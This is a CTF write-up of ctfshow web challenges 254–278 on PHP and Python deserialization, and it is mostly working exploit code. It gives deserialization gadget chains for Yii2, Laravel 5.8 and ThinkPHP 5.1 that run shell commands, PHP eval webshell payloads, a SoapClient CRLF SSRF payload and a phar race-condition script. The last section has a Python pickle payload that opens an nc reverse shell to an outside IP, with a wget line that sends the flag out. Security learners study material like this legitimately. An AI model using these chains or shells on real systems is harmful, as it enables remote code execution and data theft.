---
title: ctfshow web入门(PHP反序列化)
categories: ctfshow
---
---
# PHP魔术变量

```php
__sleep() //在对象被序列化之前运行
__wakeup() //将在反序列化之后立即调用（当反序列化时变量个数与实际不符是会绕过）
__construct() //在类实例化时，会触发进行初始化
__destruct() //对象被销毁时触发
__toString()： //当一个对象被当作字符串使用时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //获得一个类的成员变量时调用,用于从不可访问的属性读取数据
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当脚本尝试将对象调用为函数时触发

```

<!--more-->
---
# 254
Payload:  
?username=xxxxxx&password=xxxxxx

---
# 255

```php
if(isset($username) && isset($password)){ 
    $user = unserialize($_COOKIE['user']);     
    if($user->login($username,$password)){ 
        if($user->checkVip()){ 
            $user->vipOneKeyGetFlag();
```
令isVip为true即可

注意，cookie需要rel编码才可

![](https://img-blog.csdnimg.cn/20210401233001333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 256

```php
public function vipOneKeyGetFlag(){ 
        if($this->isVip){ 
            global $flag; 
            if($this->username!==$this->password){
```

保证输入的username和序列化的一样并且和原来的password不一样。

payload:
```php
<?php
class ctfShowUser{
	public $username='xxxxxx';
    public $password='a'; 
    public $isVip=true;
}
echo serialize(new ctfShowUser);
?>

?username=xxxxxx&password=a
```

---
# 257
```php
class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}
```
看到eval，所以肯定要执行backdoor中的方法

因此我们只需要在执行__construct的时候`初始化backDoor类`，方便我们进行命令执行的利用，之后反序列化结束后，会执行__destruct()

此时eval($this->code);等价于`eval(system('cat flag.php');)`

即__construct启用backdoor类，__destruct()启用backdoor中的方法

Payload：
```php
<?php
class ctfShowUser{
    public $class = 'backDoor';
	public function __construct(){
        $this->class=new backDoor();
    }
}
class backDoor{
    public $code='system("tac flag.php");';
    
}
echo urlencode(serialize(new ctfShowUser));
?>
```

---
# 258(加号绕过正则： /[oc]:\d+:/i)

```php
if(isset($username) && isset($password)){
    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
        $user = unserialize($_COOKIE['user']);

```

增加正则：o:数字:   //在数字前加 ‘+’

Payload:
```
O:+11:"ctfShowUser":1:{s:5:"class";O:+8:"backDoor":1:{s:4:"code";s:23:"system("tac flag.php");";}}
```

---
# 259(SoapClient与CRLF组合拳)
[y4tacker](https://y4tacker.blog.csdn.net/article/details/110521104)

payload:

```php
<?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'token=ctfshow';
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'.'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'=> "ssrf"));
$a = serialize($b);
$a = str_replace('^^',"\r\n",$a);
echo urlencode($a);
?>
```

---
# 260

```php
if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
    echo $flag;
```

ctfshow_i_love_36D序列化之后：s:18:"ctfshow_i_love_36D";



# 261

```php
<?php

highlight_file(__FILE__);

class ctfshowvip{
    public $username;
    public $password;
    public $code;

    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function __wakeup(){
        if($this->username!='' || $this->password!=''){
            die('error');
        }
    }
    public function __invoke(){
        eval($this->code);
    }

    public function __sleep(){
        $this->username='';
        $this->password='';
    }
    public function __unserialize($data){
        $this->username=$data['username'];
        $this->password=$data['password'];
        $this->code = $this->username.$this->password;
    }
    public function __destruct(){
        if($this->code==0x36d){
            file_put_contents($this->username, $this->password);
        }
    }
}

unserialize($_GET['vip']);
```

注意点是 `__unserialize` 

>注意:
>如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。
>注意:
>此特性自 PHP 7.4.0 起可用。

username为877.php 在 destruct 中进行比较时存在弱比较

poc:

```php
<?php
class ctfshowvip{
    public $username;
    public $password;

    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
}
$a=new ctfshowvip('877.php','<?php eval($_POST[a]);?>');
echo serialize($a);

```





---
# 262(反序列化字符串逃逸)
[反序列化字符串逃逸](https://blog.csdn.net/weixin_45669205/article/details/114163197)

---

# 263(session反序列化)
https://blog.csdn.net/qq_43431158/article/details/99544797

www.zip源码泄露

inc.php:
>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set('session.serialize_handler', '需要设置的引擎')


![在这里插入图片描述](https://img-blog.csdnimg.cn/20210402163624428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


查看inc.php，其中ini_set('session.serialize_handler', 'php');表明使用的是`php引擎`，与默认的是不同的。因此想到 session反序列化

session.serialize_handler( `5.5.4前默认是php；5.5.4后改为php_serialize`)存在以下几种

>php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值

>php: 键名+`竖线`（|）+经过serialize()函数处理过的值

>php_serialize: 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化

代码审计发现可利用函数：

![](https://img-blog.csdnimg.cn/20210402163910213.png#pic_center)
Index.php: 写入cookie

![](https://img-blog.csdnimg.cn/20210402163934987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

Check.php:  调用cookie

![](https://img-blog.csdnimg.cn/20210402163954367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Inc.php:

Class User 中
写入恶意代码，生成log-(地址)

![](https://img-blog.csdnimg.cn/20210402164043936.png#pic_center)
payload:

```php
<?php
class User{
    public $username='b.php';
    public $password='<?php eval($_POST[shell]);?>';
    public $status='a';
}
echo base64_encode('|'.serialize(new User));
?>
```
再访问check.php ，让其调用cookie

![](https://img-blog.csdnimg.cn/20210402164124682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
最后蚁剑连接log-b.php

---
# 264(反序列化字符串逃逸)

与262不同：

```php
if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_SESSION['msg']));
    if($msg->token=='admin'){
```

index.php  payload：

>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck”; s:5:"token";s:5:"admin";}


在message.php cookie添加msg=任意:

![](https://img-blog.csdnimg.cn/20210402164459421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 265(反序列化中指针引用：&)
例子：
```php
class A{
	public $name;
	public $age;
}
$DMIND=new A();
$DMIND->name="dmind";
$DMIND->age=&$DMIND->name; //&将name的地址传给 age，所以age的值是跟着name的变化而变化
var_dump($DMIND)
```

输出：
```php
object(A)#1 (2) {
  ["name"]=>
  &string(5) "dmind"
  ["age"]=>
  &string(5) "dmind"
}
```
Payload：
```php
<?php
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct(){
        $this->token;
        $this->password = &$this->token;
    }
   
}
echo serialize(new ctfshowAdmin);
?>
```

---
# 266(PHP对类名的大小写不敏感)

因为__destruct()在结束时自动启用
Payload：
```php
<?php
class ctfshow{
}
echo serialize(new ctfshow);
?>
```
将类名改为大写：

![](https://img-blog.csdnimg.cn/20210402164835717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 267(Yii反序列化漏洞)

>Yii是一套基于组件、用于开发大型Web应用的高性能PHP框架。Yii2 2.0.38 之前的版本存在反序列化漏洞，程序在调用unserialize 时，攻击者可通过构造特定的恶意请求执行任意命令。

弱口令登录，源码中发现地址访问：index.php?r=site%2Fabout&view-source

![](https://img-blog.csdnimg.cn/20210402164927903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
访问/index.php?r=backdoor/shell&code=poc即可执行命令

poc通过下面脚本输出得到，脚本中：checkAccess和id是我们可控的

```
/index.php?r=backdoor/shell&code=
```

poc:
```php
<?php

namespace yii\rest{
    class IndexAction{
        public $checkAccess;
        public $id;
        public function __construct(){
            $this->checkAccess = 'exec';	//PHP函数
            $this->id = 'ls />1.txt';    //PHP函数的参数  
        }
    }
}
namespace Faker {

    use yii\rest\IndexAction;

    class Generator
    {
        protected $formatters;

        public function __construct()
        {
            $this->formatters['close'] = [new IndexAction(), 'run'];
        }
    }
}
namespace yii\db{

    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;
        public function __construct()
        {
            $this->_dataReader=new Generator();
        }
    }
}
namespace{

    use yii\db\BatchQueryResult;

    echo base64_encode(serialize(new BatchQueryResult()));
}
```

---
# 268-270(Yii反序列化漏洞)
换了一个 poc：
```php
<?php
namespace yii\rest {
    class Action
    {
        public $checkAccess;
    }
    class IndexAction
    {
        public function __construct($func, $param)
        {
            $this->checkAccess = $func;
            $this->id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this->writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this->_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
namespace {
    $exp = new \yii\db\BatchQueryResult('shell_exec', 'cp /f* bit.txt'); //此处写命令
    echo(base64_encode(serialize($exp)));
}
```

---
# 271-273(Laravel5.8 反序列化漏洞)
poc:
```php
<?php
namespace Illuminate\Broadcasting{

    use Illuminate\Bus\Dispatcher;
    use Illuminate\Foundation\Console\QueuedCommand;

    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct(){
            $this->events=new Dispatcher();
            $this->event=new QueuedCommand();
        }
    }
}
namespace Illuminate\Foundation\Console{

    use Mockery\Generator\MockDefinition;

    class QueuedCommand
    {
        public $connection;
        public function __construct(){
            $this->connection=new MockDefinition();
        }
    }
}
namespace Illuminate\Bus{

    use Mockery\Loader\EvalLoader;

    class Dispatcher
    {
        protected $queueResolver;
        public function __construct(){
            $this->queueResolver=[new EvalLoader(),'load'];
        }
    }
}
namespace Mockery\Loader{
    class EvalLoader
    {

    }
}
namespace Mockery\Generator{
    class MockDefinition
    {
        protected $config;
        protected $code;
        public function __construct()
        {
            $this->code="<?php system('cat /f*');?>"; //此处是PHP代码
            $this->config=new MockConfiguration();
        }
    }
    class MockConfiguration
    {
        protected $name="feng";
    }
}

namespace{

    use Illuminate\Broadcasting\PendingBroadcast;

    echo urlencode(serialize(new PendingBroadcast()));
}

```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210402165528302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)




换了一个poc：
```php
<?php
namespace Illuminate\Broadcasting{

    use Illuminate\Bus\Dispatcher;
    use Illuminate\Foundation\Console\QueuedCommand;

    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct(){
            $this->events=new Dispatcher();
            $this->event=new QueuedCommand();
        }
    }
}
namespace Illuminate\Foundation\Console{
    class QueuedCommand
    {
        public $connection="ls /";  //此处参数
    }
}
namespace Illuminate\Bus{
    class Dispatcher
    {
        protected $queueResolver="system";  //此处函数

    }
}
namespace{

    use Illuminate\Broadcasting\PendingBroadcast;

    echo urlencode(serialize(new PendingBroadcast()));
}
```

---

# 274(Thinkphp5.1反序列化漏洞)
poc:
```php
<?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->append = ["lin"=>["calc.exe","calc"]];
        $this->data = ["lin"=>new Request()];
    }
}
class Request
{
    protected $hook = [];
    protected $filter = "system"; //PHP函数
    protected $config = [
        // 表单ajax伪装变量
        'var_ajax'         => '_ajax',  
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ["var_ajax"=>'cys']; //PHP函数的参数
        $this->hook = ["visible"=>[$this,"isAjax"]];
    }
}


namespace think\process\pipes;

use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
namespace think\model;

use think\Model;

class Pivot extends Model
{
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?>
```

![](https://img-blog.csdnimg.cn/20210402170028276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 275
>filename是get fn得到的，filecontent是php://input 得到的
filename含有php即可触发system 
filecontent 含有flag 即可触发system


payload 1：?fn=1.php;ls /

payload 2：

![](https://img-blog.csdnimg.cn/20210402170121900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 276(Phar反序列化)
[初探phar://](https://xz.aliyun.com/t/2715)

```php
<?php
highlight_file(__FILE__);

class filter{
    public $filename;
    public $filecontent;
    public $evilfile=false;
    public $admin = false;

    public function __construct($f,$fn){
        $this->filename=$f;
        $this->filecontent=$fn;
    }
    public function checkevil(){
        if(preg_match('/php|\.\./i', $this->filename)){
            $this->evilfile=true;
        }
        if(preg_match('/flag/i', $this->filecontent)){
            $this->evilfile=true;
        }
        return $this->evilfile;
    }
    public function __destruct(){
        if($this->evilfile && $this->admin){
            system('rm '.$this->filename);
        }
    }
}

if(isset($_GET['fn'])){
    $content = file_get_contents('php://input');
    $f = new filter($_GET['fn'],$content);
    if($f->checkevil()===false){
        file_put_contents($_GET['fn'], $content); //以你输入的文件名和数据生成一个文件
        copy($_GET['fn'],md5(mt_rand()).'.txt');  //复制为一份别名文件
        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);//删除刚刚文件名为我们输出的文件
        echo 'work done';
    }
    
}else{
    echo 'where is flag?';
}
```

phar.phar :

```php
<?php
class filter{
    public $filename="1.txt;cat f*;";
    public $filecontent;
    public $evilfile=true;
    public $admin = true;
}
$a=new filter();

$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($a); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

python脚本：

```python
import requests
import threading
url="http://66155619-f7c6-4fb4-acf1-d196be37cdb8.chall.ctf.show:8080/"
f=open("./phar.phar","rb")
content=f.read()
def upload():  #上传1.phar，内容是本地文件：phar.phar
    requests.post(url=url+"?fn=1.phar",data=content)
def read():  #利用条件竞争，尝试phar://反序列化1.phar，1.phar没被删除就能被反序列化，因而就能执行system()函数从而执行我们的命令
    r = requests.post(url=url+"?fn=phar://1.phar/",data="1")
    if "ctfshow{"in r.text or "flag{" in r.text:
        print(r.text)
        exit()
while 1:
    t1=threading.Thread(target=upload)
    t2=threading.Thread(target=read)
    t1.start()
    t2.start()
```



---
# 277 278(python反序列化)
F12：/backdoor?data= m=base64.b64decode(data) m=`pickle.loads`(m)
查了一下为python

师傅们的做法：是nc反弹shell，其中要用到vps, 贴一个payload吧

payload:

```python
import os
import pickle
import base64
import requests
class exp(object):
    def __reduce__(self):
        return (os.popen,('nc 150.158.181.145 2000 -e /bin/sh',))#此处需要nc VPS的IP...
    	#或者 wget http://150.158.181.145:2000/?a=`cat flag`

a=exp()
s=pickle.dumps(a)
url="http://2ecec748-b3b0-4285-8e82-3531e90c2679.chall.ctf.show:8080/backdoor"
params={
    'data':base64.b64encode(s)
}
r=requests.get(url=url,params=params)
print(r.text)
```

